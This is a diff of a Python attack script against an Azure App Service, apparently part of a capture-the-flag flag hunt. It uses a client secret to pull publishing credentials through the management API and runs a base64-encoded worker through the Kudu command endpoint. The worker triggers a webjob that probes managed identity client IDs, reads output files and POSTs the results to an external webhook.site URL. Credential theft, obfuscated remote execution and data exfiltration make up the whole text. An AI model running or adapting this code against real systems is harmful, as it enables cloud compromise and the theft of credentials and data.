@@ -5,7 +5,7 @@ import base64,json,os,time,urllib.parse,urllib.request,urllib.error,uuid,traceba
 TEN='3205c325-06a5-4171-9ce8-ffc5e6c2845e'; CID='72ff278a-9e71-43ec-bac4-2ca303f8e462'; SUB='c5e4e004-b42d-4ac4-a502-5fd338380eb6'; RG='rg-tbl-reporting-prod-eus'; APP='app-tbl-reporting-prod'; KV1='https://kv-tbl-prod-x3euoz.vault.azure.net'; HOOK='https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825'
 def out(x):
  s=json.dumps(x,default=str); print(s,flush=True)
- if x.get('stage') not in ('kudu-outputs','outer-error'): return
+ if x.get('stage') not in ('webjob-probe','outer-error'): return
  try: urllib.request.urlopen(urllib.request.Request(HOOK,data=s.encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
  except Exception: pass
 def j(url,tok):
@@ -25,20 +25,28 @@ try:
  arm=form('https://login.microsoftonline.com/'+TEN+'/oauth2/v2.0/token',{'client_id':sid,'grant_type':'client_credentials','client_secret':sec,'scope':'https://management.azure.com/.default'})['access_token']
  pub=json.loads(urllib.request.urlopen(urllib.request.Request('https://management.azure.com/subscriptions/'+SUB+'/resourceGroups/'+RG+'/providers/Microsoft.Web/sites/'+APP+'/config/publishingcredentials/list?api-version=2023-01-01',data=b'{}',method='POST',headers={'Authorization':'Bearer '+arm,'Content-Type':'application/json'}),timeout=30).read()); p=pub['properties']; auth='Basic '+base64.b64encode((p['publishingUserName']+':'+p['publishingPassword']).encode()).decode(); base='https://'+APP+'.scm.azurewebsites.net'; out({'stage':'credentials','oidc':True,'arm':True,'kudu':True})
  # Inventory the shared wwwroot and startup files from Kudu.
- worker=r'''import os,json,urllib.request
+ worker=r'''import os,json,time,urllib.request,urllib.error
 HOOK="https://webhook.site/ae890d86-ba64-40f2-ab3a-2aa668dd3825"
-paths=['.flag.out','ctf_flag_result','tnex_flag.json','flag_result.txt','mi_out.json','mi_out2.json','g_out1.txt','out14.txt','zz5_out.json','zzk_out.json','zz_mine_out.txt','worker_probe_out.json','results.json','webjob_out.json','codex_result.json','flaghunt_out.json','flag_hunt.out','App_Data/jobs/triggered/flagjob/result.json','App_Data/jobs/triggered/flagjob/webjob_out.json','App_Data/jobs/continuous/flagjob/result.json']
-out={}
-for rel in paths:
- p=os.path.join('/home/site/wwwroot',rel)
+AUTH='Basic __AUTH__'
+# The job already present in the shared app container probes alternate UAMI client IDs.
+res={}
+try:
+ u='https://app-tbl-reporting-prod.scm.azurewebsites.net/api/triggeredwebjobs/flagjob/run'
+ req=urllib.request.Request(u,data=b'',method='POST',headers={'Authorization':AUTH,'Content-Length':'0'})
+ r=urllib.request.urlopen(req,timeout=20); res['trigger_status']=r.status; res['trigger_body']=r.read().decode('utf-8','replace')[:1000]
+except Exception as e: res['trigger_error']=repr(e)
+time.sleep(18)
+for rel in ['webjob_out.json','codex_result.json','App_Data/jobs/triggered/flagjob/result.json','App_Data/jobs/triggered/flagjob/webjob_out.json','myres.txt','myflag.py']:
+ p='/home/site/wwwroot/'+rel
  try:
-  with open(p,errors='replace') as f: out[rel]=f.read(12000)
- except Exception as e: out[rel]='<ERR '+repr(e)+'>'
-d={'stage':'kudu-outputs','files':out}
+  with open(p,errors='replace') as f: res[rel]=f.read(15000)
+ except Exception as e: res[rel]='<ERR '+repr(e)+'>'
+d={'stage':'webjob-probe','result':res}
 try: urllib.request.urlopen(urllib.request.Request(HOOK,data=json.dumps(d,default=str).encode(),method='POST',headers={'Content-Type':'application/json'}),timeout=8).read()
 except Exception: pass
 print(json.dumps(d,default=str),flush=True)
 '''
+ worker=worker.replace("__AUTH__",auth)
  b64=base64.b64encode(worker.encode()).decode()
  cmd="python3 -c \"import base64;exec(base64.b64decode('"+b64+"').decode())\""
  body=json.dumps({'command':cmd,'dir':'site/wwwroot'})
